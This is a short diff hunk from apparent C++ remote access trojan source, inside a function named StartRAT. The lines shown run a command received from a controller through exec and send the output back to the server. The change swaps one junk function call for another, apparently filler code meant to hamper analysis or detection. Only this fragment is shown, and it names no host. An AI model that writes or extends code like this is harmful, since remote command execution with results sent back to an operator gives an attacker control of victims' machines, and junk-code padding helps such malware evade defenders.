@@ -29,7 +29,7 @@ DWORD WINAPI StartRAT(LPVOID lpParam)
 
 		std::string result = exec(commandLine);
 
-		not_inlined_junk_func_2(0.456f);
+		junk();
 
 		// send result back to server
 		conn->send_data(result);
